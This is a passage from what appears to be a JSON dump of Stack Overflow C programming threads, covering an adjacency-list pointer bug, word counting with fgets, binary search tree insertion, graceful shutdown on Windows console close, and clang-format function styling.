0 to 1\n    addEdge(list, createEdge(0, 1, 22));\n    addEdge(list, createEdge(1, 0, 22));\n\n// this is where the problem happens, when i call addEdge(list, createEdge(0, 2, 9)); \n// as soon as it enters addEdge, list[0] goes from pointing to the 0-1 edge to already\n// pointing to this second edge, 0 to 2\n\n    // second edge from vertex 0 to 2\n    addEdge(list, createEdge(0, 2, 9));\n    addEdge(list, createEdge(2, 0, 9));\n\n    ...\n}\n// creates and returns an edge node\nstruct createEdge(int v1, int v2, int weight){\n    struct edge newEdge;\n    newEdge.v1 = v1;\n    newEdge.v2 = v2;\n    newEdge.weight = weight;\n    newEdge.next = 0;\n    return newEdge;\n}\n// adds the edge to the adjacency list\nvoid addEdge(struct edge **list, struct edge newEdge){\n// at this point, after the addEdge(list, createEdge(0, 2, 9)); call, list[0] is now \n// pointing to this new edge and Edge(0, 1, 22) is gone\n    for(int i = 0; i &lt; MAX; ++i){\n        // if edge vertex equals index i\n        if(newEdge.v1 == i){\n            // if list index is empty, place it at head and return\n            if(list[i] == 0){\n                list[i] = &amp;newEdge;\n                return;\n            // else traverse to the end, place it and return\n            }else{\n                struct edge* curr = list[i];\n                while(curr-&gt;next != 0)\n                    curr = curr-&gt;next;\n                curr-&gt;next = &amp;newEdge;\n                return;\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>thanks</p>\n"}, {"tags": ["c", "struct", "fgets"], "comments": [{"owner": {"reputation": 5311, "user_id": 7932914, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/CgA4c.jpg?s=128&g=1", "display_name": "Dinesh", "link": "https://stackoverflow.com/users/7932914/dinesh"}, "edited": false, "score": 0, "creation_date": 1518642716, "post_id": 48795512, "comment_id": 84595032, "body": "what do you mean by &quot;I am having difficulty removing the rest of the values&quot;"}, {"owner": {"reputation": 97, "user_id": 3583252, "user_type": "registered", "accept_rate": 73, "profile_image": "https://lh3.googleusercontent.com/-3lviP6dy1EE/AAAAAAAAAAI/AAAAAAAAEMM/lHdLl2479q0/photo.jpg?sz=128", "display_name": "Toby Cook", "link": "https://stackoverflow.com/users/3583252/toby-cook"}, "reply_to_user": {"reputation": 5311, "user_id": 7932914, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/CgA4c.jpg?s=128&g=1", "display_name": "Dinesh", "link": "https://stackoverflow.com/users/7932914/dinesh"}, "edited": false, "score": 0, "creation_date": 1518642919, "post_id": 48795512, "comment_id": 84595128, "body": "@Dinesh If the word &quot;Hello&quot; is counted twice in the file, I want my console to only print &quot;Hello&quot; once and not the number of times it was counted"}, {"owner": {"reputation": 5311, "user_id": 7932914, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/CgA4c.jpg?s=128&g=1", "display_name": "Dinesh", "link": "https://stackoverflow.com/users/7932914/dinesh"}, "edited": false, "score": 0, "creation_date": 1518643040, "post_id": 48795512, "comment_id": 84595199, "body": "maintain a map with words and count. if the word already exists increase the count, else insert into the map with count 1. And while printing print the word and the count from the map."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518643060, "post_id": 48795512, "comment_id": 84595211, "body": "&quot;keep it similar to the current solution.&quot; leads to the same problem.  Rather than re-read the file, compare string against the list  read so far and only add new words to the list.  Replace <code>w-&gt;word = key_word;</code> with <code>w-&gt;word = strdup(key_word);</code>"}, {"owner": {"reputation": 97, "user_id": 3583252, "user_type": "registered", "accept_rate": 73, "profile_image": "https://lh3.googleusercontent.com/-3lviP6dy1EE/AAAAAAAAAAI/AAAAAAAAEMM/lHdLl2479q0/photo.jpg?sz=128", "display_name": "Toby Cook", "link": "https://stackoverflow.com/users/3583252/toby-cook"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518643062, "post_id": 48795512, "comment_id": 84595214, "body": "@chux I have tried using an additional for loop and strcmp() but nothing has worked so I just removed the code again."}], "answers": [{"tags": [], "owner": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "is_accepted": true, "score": 0, "last_activity_date": 1518643758, "creation_date": 1518643758, "answer_id": 48796548, "question_id": 48795512, "link": "https://stackoverflow.com/questions/48795512/c-how-to-count-occurrences-of-each-word-in-a-file-and-remove-duplicate-words/48796548#48796548", "title": "C - How to count occurrences of each word in a file and remove duplicate words", "body": "<p>Check to see if you found the <code>current_word</code> earlier in the list than the <code>key_word</code> you're looking for.  You can do this using <code>ftell(...)</code> on the file pointer.</p>\n\n<p>Here's an example;</p>\n\n<pre><code>int count_words()\n{\n    // Allocate memory for first word to compare + words struct\n    char *key_word = (char*)malloc(sizeof(char) * SIZE);\n    struct words *w = (struct words*)malloc(sizeof(struct words) * SIZE);\n    // Create variable to read words from file\n    FILE *word_list = fopen(\"single_words_test.txt\", \"r\");\n    // Variable to store total word count\n    int total_words = 0;\n    long word_list_pos, word_list2_pos;\n\n\n    // Read in words from file line by line\n    while (fgets(key_word, SIZE, word_list) != NULL)\n    {\n        // Remove the newline character\n        key_word[strlen(key_word) - 1] = '\\0';\n        // Initialize members of words structure\n        w-&gt;word = strdup(key_word);\n        w-&gt;count = 0;\n        word_list_pos = ftell(word_list);\n\n        // Allocate memory for current word being compared to key_word\n        char *current_word = (char*)malloc(sizeof(char) * SIZE);\n        // Create variable to read second list of words from file\n        FILE *word_list2 = fopen(\"single_words_test.txt\", \"r\");\n\n        while (fgets(current_word, SIZE, word_list2) != NULL)\n        {\n            // Remove newline character\n            current_word[strlen(current_word) - 1] = '\\0';\n            // If currrent read word matches keyword, increase its count\n            if (strcmp(key_word, current_word) == 0)\n            {\n                word_list2_pos = ftell(word_list2);                \n                if (word_list2_pos &lt; word_list_pos)\n                    break;\n\n                w-&gt;count++;\n            }\n        }\n        total_words++;\n\n        if (word_list2_pos &gt;= word_list_pos)\n            printf(\"%s : %d\\n\", w-&gt;word, w-&gt;count);\n\n        // Free the allocated memory\n        free(w-&gt;word);\n        free(current_word);\n        fclose(word_list2);\n\n    }\n\n    free(w);\n    free(key_word);\n    fclose(word_list);\n\n    return total_words;\n}\n</code></pre>\n"}], "owner": {"reputation": 97, "user_id": 3583252, "user_type": "registered", "accept_rate": 73, "profile_image": "https://lh3.googleusercontent.com/-3lviP6dy1EE/AAAAAAAAAAI/AAAAAAAAEMM/lHdLl2479q0/photo.jpg?sz=128", "display_name": "Toby Cook", "link": "https://stackoverflow.com/users/3583252/toby-cook"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1109, "favorite_count": 0, "accepted_answer_id": 48796548, "answer_count": 1, "score": 0, "last_activity_date": 1518643758, "creation_date": 1518639507, "last_edit_date": 1518643257, "question_id": 48795512, "link": "https://stackoverflow.com/questions/48795512/c-how-to-count-occurrences-of-each-word-in-a-file-and-remove-duplicate-words", "title": "C - How to count occurrences of each word in a file and remove duplicate words", "body": "<p>My current assignment in university is to read in words from a file and count the occurrences of each word in that file, printing my results to the console/new file.</p>\n\n<p>I have been successful in counting the word occurrences, however, I am having difficulty removing the rest of the values.</p>\n\n<p>E.g. I want to remove the additional occurrences of C, but keep its count.</p>\n\n<p><code>C : 2\nthey : 2\nare : 1\nnot : 1\nthey : 2\nwritten : 1\nin : 1\nC : 2</code></p>\n\n<p>Here is the code I have at the moment...</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define SIZE 256\n\nstruct words\n{\n    char *word;\n    unsigned int count;\n};\n\nint count_words()\n{\n    // Allocate memory for first word to compare + words struct\n    char *key_word = (char*)malloc(sizeof(char) * SIZE);\n    struct words *w = (struct words*)malloc(sizeof(struct words) * SIZE);\n    // Create variable to read words from file\n    FILE *word_list = fopen(\"single_words_test.txt\", \"r\");\n    // Variable to store total word count\n    int total_words = 0;\n\n    // Read in words from file line by line\n    while (fgets(key_word, SIZE, word_list) != NULL)\n    {\n        // Remove the newline character\n        key_word[strlen(key_word) - 1] = '\\0';\n        // Initialize members of words structure\n        w-&gt;word = key_word;\n        w-&gt;count = 0;\n        // Allocate memory for current word being compared to key_word\n        char *current_word = (char*)malloc(sizeof(char) * SIZE);\n        // Create variable to read second list of words from file\n        FILE *word_list2 = fopen(\"single_words_test.txt\", \"r\");\n\n        while (fgets(current_word, SIZE, word_list2) != NULL)\n        {\n            // Remove newline character\n            current_word[strlen(current_word) - 1] = '\\0';\n            // If currrent read word matches keyword, increase its count\n            if (strcmp(key_word, current_word) == 0)\n            {\n                w-&gt;count++;\n            }\n        }\n        // Free the allocated memory\n        free(current_word);\n        fclose(word_list2);\n\n        total_words++;\n\n        printf(\"%s : %d\\n\", w-&gt;word, w-&gt;count);\n    }\n\n    free(w);\n    free(key_word);\n    fclose(word_list);\n\n    return total_words;\n}\n\nint main(int argc, char **argv)\n{\n\n    printf(\"\\n\\n\\n%d\\n\\n\\n\", count_words());\n\n    return 0;\n\n}\n</code></pre>\n\n<p>I know the code is messy but I have been stuck on this for some time and I am unsure of how to implement it into my current solution.</p>\n\n<p>Also, I know this could be done by creating a linked-list but I want to avoid that solution and keep it similar to the current solution.</p>\n\n<p>Thank you and sorry for the ambiguity of the question</p>\n\n<p>EDIT: This isn't a code request. I would just like some general guidance as to what I could use</p>\n"}, {"tags": ["c", "binary-search-tree"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518639300, "post_id": 48795386, "comment_id": 84593255, "body": "<code>bst* new = create_bst();</code> followed by <code>bst_insert(new, (void*)w, compare_words);</code> passes a <code>bst *</code> to a function that expects a <code>bstnode *</code>. That&#39;s not going to end well. And the compiler should be generating a warning about that. Don&#39;t ignore the compiler warnings."}, {"owner": {"reputation": 19, "user_id": 7783261, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1584778654870502/picture?type=large", "display_name": "Jersey Fonseca", "link": "https://stackoverflow.com/users/7783261/jersey-fonseca"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518639761, "post_id": 48795386, "comment_id": 84593478, "body": "I updated this. It is actually called to bst_insert which then calls bstnode_insert"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518640221, "post_id": 48795386, "comment_id": 84593749, "body": "See <a href=\"https://stackoverflow.com/help/mcve\">minimal, complete, and verifiable example</a> in the <a href=\"https://stackoverflow.com/help\">help center</a>."}], "answers": [{"tags": [], "owner": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "is_accepted": false, "score": 0, "last_activity_date": 1518688130, "creation_date": 1518688130, "answer_id": 48804153, "question_id": 48795386, "link": "https://stackoverflow.com/questions/48795386/binary-search-tree-insert-function-does-not-update-binary-search-tree/48804153#48804153", "title": "Binary search tree insert function does not update binary search tree", "body": "<p>Here is a (minimum) Binary Tree implementation :</p>\n\n<p>First a function to create a tree :</p>\n\n<pre><code>Tree_t* create_dynamic_tree()\n{\n    Tree_t* my_tree = NULL;\n    my_tree = (Tree_t*) malloc(sizeof(Tree_t));\n    my_tree-&gt;number_of_nodes = 0;\n    my_tree-&gt;root = NULL;\n    my_tree-&gt;max_key = 0;\n    return my_tree;\n}\n</code></pre>\n\n<p>Where a tree is </p>\n\n<pre><code>typedef struct Tree_t\n{\n    int number_of_nodes;\n    Node_t* root;\n}Tree_t;\n</code></pre>\n\n<p>and a node is :</p>\n\n<pre><code>struct Node_t\n{\n    void* data;\n    int key;\n    Node_t* left_child;\n    Node_t* right_child;\n};\n</code></pre>\n\n<p>Now you need a function to add data and should be something like this :</p>\n\n<pre><code>int data_add(Tree_t* tree_dest , void* data , int* data_key)\n{\n    if(tree_dest == NULL || data == NULL )\n    {\n        return -1;\n    }\n    int key = 0;\n    Node_t* parent;\n    key = *data_key;\n    if(key&lt;0)\n    {\n        return -2;\n    }\n    if(tree_dest-&gt;number_of_nodes == 0)\n    {\n        Node_t* temp = NULL;\n        temp = (Node_t*) malloc(sizeof(Node_t));\n        temp-&gt;data = data;\n        temp-&gt;key = key;\n        temp-&gt;left_child = NULL;\n        temp-&gt;right_child = NULL;\n\n        tree_dest-&gt;number_of_nodes++;\n        tree_dest-&gt;root = temp;\n        return key;\n    }\n    exists_t existance = not_exist;\n    exists_t* exist_ptr = NULL;\n    exist_ptr = &amp;existance;\n\n    if(is_key_exists(tree_dest , &amp;parent ,key , exist_ptr) == 0)\n    {\n        if(existance == exist)\n        {\n            return -1;\n        }\n        else\n        {\n            if(insert_node(tree_dest , &amp;parent ,data , key) == -1)\n            {\n                return -1;\n            }\n        }\n    }\n    if(tree_dest-&gt;max_key &lt; key)\n    {\n        tree_dest-&gt;max_key = key;\n    }\n    //free(parent);\n    return key;\n}\n</code></pre>\n\n<p>The above function uses these functions :</p>\n\n<p>--is_key_exists()</p>\n\n<pre><code>int is_key_exists(Tree_t* the_tree ,  Node_t** parent , int key , exists_t* exist_t)\n{\n    if(the_tree == NULL )\n    {\n        return -1;\n    }\n    Node_t* root = the_tree-&gt;root;\n    search_node_parent(the_tree , &amp;root , parent , key);\n    if(root != NULL)\n    {\n        *exist_t = exist;\n        return 0;\n    }\n    else\n    {\n        *exist_t = not_exist;\n        return 0;\n    }\n}\n</code></pre>\n\n<p>--insert_node()</p>\n\n<pre><code>int insert_node(Tree_t* tree_dest , Node_t** parent ,void* data , int key)\n{\n    if(tree_dest == NULL || data == NULL || parent == NULL )\n    {\n        return -1;\n    }\n    Node_t* new_node = NULL;\n    new_node = (Node_t*) malloc(sizeof(Node_t));\n    new_node-&gt;data = data;\n    new_node-&gt;key = key;\n    new_node-&gt;left_child = NULL;\n    new_node-&gt;right_child = NULL;\n\n    if(key &lt; (*parent)-&gt;key )\n    {\n        (*parent)-&gt;left_child = new_node;\n    }\n    if(key &gt; (*parent)-&gt;key)\n    {\n        (*parent)-&gt;right_child = new_node;\n    }\n    tree_dest-&gt;number_of_nodes++;\n    if(tree_dest-&gt;max_key &lt; key)\n    {\n        tree_dest-&gt;max_key = key;\n    }\n    return 0;\n}\n</code></pre>\n\n<p>What I do here is to take void* data , a pointer to everything you need (a char* you use here , or a structure/union) , encapsulating the data inside a node and add it in the tree using an id (in your case maybe the number of line in file).\nI hope this help you , or anyone else in the future that needs a (basic) tree implementation.\nThis is all you need for insertion.Next step will be to rehash , if you want a balanced tree.</p>\n\n<p>Thank you.</p>\n"}], "owner": {"reputation": 19, "user_id": 7783261, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1584778654870502/picture?type=large", "display_name": "Jersey Fonseca", "link": "https://stackoverflow.com/users/7783261/jersey-fonseca"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 55, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1518688130, "creation_date": 1518638921, "last_edit_date": 1518639732, "question_id": 48795386, "link": "https://stackoverflow.com/questions/48795386/binary-search-tree-insert-function-does-not-update-binary-search-tree", "title": "Binary search tree insert function does not update binary search tree", "body": "<p>I am trying to take a text file and turn it into a binary search tree. Here is my function that takes in the text file and passes it to bst_insert:</p>\n\n<pre><code>bst* get_counts(char *filename) {\n    bst* new = create_bst();\n    FILE *fp;\n    char buffer[500];\n    char* delim = \" .,'/'\\n;?&gt;&lt;:\";\n    char* token;\n    if (!(fp = fopen(filename, \"r\"))) {\n        fprintf(stderr, \"Could not open file.\");\n        exit(0);\n    }\n\n    while(fgets(buffer, 500, fp)) {\n        token = strtok(buffer, delim);\n        while (token) {\n            wordcount* w = (wordcount*)malloc(sizeof(wordcount));\n            w-&gt;count = 0;\n            strcpy(w-&gt;word, token);\n            bst_insert(new, (void*)w, compare_words);\n            token = strtok(NULL, delim);\n        }\n    }\n\n    fclose(fp);\n    return new;;\n}\n</code></pre>\n\n<p>Here is bst_insert which then calls bst_insert:</p>\n\n<pre><code>void bst_insert(bst *tree, void *item, int (*compare)(void *, void *))\n{\n    if (tree)\n        tree-&gt;root = bstnode_insert(tree-&gt;root, item, compare);\n}\n\n\n\nbstnode* bstnode_insert(bstnode *node, void *item,\n                        int (*compare)(void *, void *))\n{\n    bstnode *new_node = (bstnode*)malloc(sizeof(bstnode));\n    new_node-&gt;item = item;\n    new_node-&gt;rsub = NULL;\n    new_node-&gt;lsub = NULL;\n\n    if (!node) {\n        node = (bstnode*)malloc(sizeof(bstnode));\n        node-&gt;item = item;\n        node-&gt;rsub = NULL;\n        node-&gt;lsub = NULL;\n        return node;\n    }\n    wordcount *w1 = (wordcount*) item;\n    wordcount *w2 = (wordcount*)node-&gt;item;\n    int comp = compare(w1-&gt;word, w2-&gt;word);\n\n    if (comp &lt; 0) {\n        if (node-&gt;lsub)\n            node-&gt;lsub = bstnode_insert(node-&gt;lsub, item, compare);\n        else {\n            node-&gt;lsub = new_node;\n        }\n    }\n    else if (comp &gt; 0) {\n        if (node-&gt;rsub)\n            node-&gt;rsub = bstnode_insert(node-&gt;rsub, item, compare);\n        else {\n            node-&gt;rsub = new_node;\n        }\n    } else {\n       bstnode_insert(node-&gt;rsub, item, compare);\n    }\n    return node;\n}\n</code></pre>\n\n<p>For some reason, my function only ends up creating the first node of the tree, I am not sure why. I would like for it to make the entire node.</p>\n"}, {"tags": ["c++", "c", "windows", "console-application"], "comments": [{"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1518638624, "post_id": 48795246, "comment_id": 84592957, "body": "Your application is either written in C, or written in C++. Which is it?"}, {"owner": {"reputation": 4535, "user_id": 268006, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dbd9d461a54696a1e51d697e38b3b96e?s=128&d=identicon&r=PG", "display_name": "Fake Name", "link": "https://stackoverflow.com/users/268006/fake-name"}, "reply_to_user": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1518638703, "post_id": 48795246, "comment_id": 84593002, "body": "@LightnessRacesinOrbit - It&#39;s C++, but I&#39;d accept either c or c++ answers. I&#39;d prefer C++, but I don&#39;t have issues calling C APIs."}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1518638811, "post_id": 48795246, "comment_id": 84593038, "body": "Being that they are two different languages, we would prefer you focus on one at a time (and only tag one at a time unless the question is specifically about the differences/similarities between them)."}, {"owner": {"reputation": 4535, "user_id": 268006, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dbd9d461a54696a1e51d697e38b3b96e?s=128&d=identicon&r=PG", "display_name": "Fake Name", "link": "https://stackoverflow.com/users/268006/fake-name"}, "reply_to_user": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1518638950, "post_id": 48795246, "comment_id": 84593106, "body": "@LightnessRacesinOrbit - This question is basically a &quot;where&#39;s the right API&quot; thing, and I don&#39;t really care whether the answer is c or c++. Anyways, the dupe answers my question, so I guess it&#39;s irrelevant."}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1518639182, "post_id": 48795246, "comment_id": 84593204, "body": "We care, as I have stated."}], "answers": [{"tags": [], "owner": {"reputation": 4535, "user_id": 268006, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dbd9d461a54696a1e51d697e38b3b96e?s=128&d=identicon&r=PG", "display_name": "Fake Name", "link": "https://stackoverflow.com/users/268006/fake-name"}, "is_accepted": false, "score": 0, "last_activity_date": 1518638673, "creation_date": 1518638673, "answer_id": 48795333, "question_id": 48795246, "link": "https://stackoverflow.com/questions/48795246/gracefully-shut-down-command-line-application-on-console-window-closure-on-wind/48795333#48795333", "title": "Gracefully shut-down command-line application on console window closure (on windows)", "body": "<p>And as soon as I ask the question, I find <a href=\"https://stackoverflow.com/questions/26404907/gracefully-terminate-a-boost-asio-based-windows-console-application\">Gracefully terminate a Boost Asio based Windows console application</a>, which exactly answers it (I'm even using boost-asio!).</p>\n"}], "owner": {"reputation": 4535, "user_id": 268006, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dbd9d461a54696a1e51d697e38b3b96e?s=128&d=identicon&r=PG", "display_name": "Fake Name", "link": "https://stackoverflow.com/users/268006/fake-name"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 506, "favorite_count": 0, "closed_date": 1518638490, "answer_count": 1, "score": 0, "last_activity_date": 1518639278, "creation_date": 1518638333, "question_id": 48795246, "link": "https://stackoverflow.com/questions/48795246/gracefully-shut-down-command-line-application-on-console-window-closure-on-wind", "closed_reason": "Duplicate", "title": "Gracefully shut-down command-line application on console window closure (on windows)", "body": "<p>I have a small(ish) command-line application that talks to some custom hardware.</p>\n\n<p>Right now, you run the executable, and it pops up a console window, and does it's thing. I'm handling <code>SIGINT</code> and <code>SIGTERM</code> so if you hit <kbd>ctrl</kbd>+<kbd>c</kbd> <em>in</em> the console window, it shuts down gracefully, and releases the custom hardware.</p>\n\n<p>However, if kill the application by simply closing the console window (click the \"x\" in the corner), it seems to basically be immediately killed, with no time to do <em>any</em> cleanup.</p>\n\n<p>I'd like to be able to do my shutdown procedures if the console is closed. I've not had much luck trying to find out what, exactly, is even happening to my process when it's console is closed.</p>\n"}, {"tags": ["c", "clang", "clang-format"], "comments": [{"owner": {"reputation": 33645, "user_id": 2630032, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hQF09.jpg?s=128&g=1", "display_name": "Stephan Lechner", "link": "https://stackoverflow.com/users/2630032/stephan-lechner"}, "edited": false, "score": 1, "creation_date": 1518636578, "post_id": 48794750, "comment_id": 84591869, "body": "What is <code>Arg</code>, why does your second example have two equally named parameters <code>arg1</code>, and what do you mean with &quot;style of function declaration&quot;?"}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1518638089, "post_id": 48794750, "comment_id": 84592702, "body": "Why the downvotes? This is a perfectly sensible question about how to use a tool to achieve a certain result, and tagged correctly."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1518638195, "post_id": 48794750, "comment_id": 84592750, "body": "@LeeDanielCrocker It&#39;s hard to understand it actually is. The important part of the question is in the title but not in the body. I voted to close as unclear at first and it took some time for me to retract it..."}, {"owner": {"reputation": 21, "user_id": 8658377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98c293867627e93a72e86fbb1773c695?s=128&d=identicon&r=PG&f=1", "display_name": "Tempoz", "link": "https://stackoverflow.com/users/8658377/tempoz"}, "reply_to_user": {"reputation": 33645, "user_id": 2630032, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hQF09.jpg?s=128&g=1", "display_name": "Stephan Lechner", "link": "https://stackoverflow.com/users/2630032/stephan-lechner"}, "edited": false, "score": 0, "creation_date": 1518641983, "post_id": 48794750, "comment_id": 84594618, "body": "@StephanLechner, edited to add clarifications. Arg is just a type. By style I mean I want to format my code to match this specific code-style of function declarations. Let me know if that&#39;s clear."}, {"owner": {"reputation": 21, "user_id": 8658377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98c293867627e93a72e86fbb1773c695?s=128&d=identicon&r=PG&f=1", "display_name": "Tempoz", "link": "https://stackoverflow.com/users/8658377/tempoz"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518642040, "post_id": 48794750, "comment_id": 84594647, "body": "@EugeneSh. Edited post to make it more clear, does that help? Let me know if it needs more information."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 8658377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98c293867627e93a72e86fbb1773c695?s=128&d=identicon&r=PG&f=1", "display_name": "Tempoz", "link": "https://stackoverflow.com/users/8658377/tempoz"}, "edited": false, "score": 0, "creation_date": 1518795754, "post_id": 48794990, "comment_id": 84664312, "body": "Thanks for the reply"}], "tags": [], "owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "is_accepted": false, "score": 1, "last_activity_date": 1518637235, "creation_date": 1518637235, "answer_id": 48794990, "question_id": 48794750, "link": "https://stackoverflow.com/questions/48794750/how-to-clang-format-this-style-of-function-definition/48794990#48794990", "title": "How to clang-format this style of function definition", "body": "<p>I don't see how to do it with <code>clang-format</code>, but <code>indent</code> can come pretty close:</p>\n\n<pre><code>indent -i4 -cd24 -blf -bfda file.c\n</code></pre>\n\n<p>(except for that closing paren--not sure how to do that).</p>\n"}], "owner": {"reputation": 21, "user_id": 8658377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98c293867627e93a72e86fbb1773c695?s=128&d=identicon&r=PG&f=1", "display_name": "Tempoz", "link": "https://stackoverflow.com/users/8658377/tempoz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 263, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518641890, "creation_date": 1518636350, "last_edit_date": 1518641890, "question_id": 48794750, "link": "https://stackoverflow.com/questions/48794750/how-to-clang-format-this-style-of-function-definition", "title": "How to clang-format this style of function definition", "body": "<p>I would like to format my C code to a specific style of function definition like so:</p>\n\n<p>foo.c (where \"Arg\" is a type/struct)</p>\n\n<p>Example1:</p>\n\n<pre><code>void *\nfoo(\n    const Arg *arg1 /**&lt; my arg */\n)\n{\n...\n}\n</code></pre>\n\n<p>Example2</p>\n\n<pre><code>void *\nfoo(\n    const Arg *arg1, /**&lt; my arg */\n    const Arg *arg2  /**&lt; my arg2 */\n)\n{\n...\n}\n</code></pre>\n\n<ol>\n<li>Break after return type (AlwaysBreakAfterDefinitionReturnType) - this works</li>\n<li>Break after name of function+open parens</li>\n<li>Each argument on a new line, indented</li>\n<li>closing parens on new line, un-indented</li>\n</ol>\n\n<p>I've tried many combinations of parameters without success... any tips?</p>\n"}, {"tags": ["c", "typedef", "function-prototypes"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 